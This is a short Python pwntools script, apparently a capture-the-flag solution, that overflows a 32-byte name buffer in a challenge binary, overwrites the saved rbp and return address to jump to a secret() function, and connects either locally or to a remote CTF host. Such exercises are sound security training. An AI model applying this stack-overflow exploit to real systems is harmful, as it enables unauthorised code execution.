from pwn import *

io = None

if args.LOCAL:
    io = process('./deploy/service/task.elf')
else:
    io = remote('ctf.li2sites.ru', 21001)

io.recvuntil(b'name?\n')

payload = b''
payload += b'A' * 32     #  junk for name array
payload += b'B' * 8      #  junk for saved rbp
payload += p64(0x401172) #  address of the secret() function

io.sendline(payload)

io.interactive()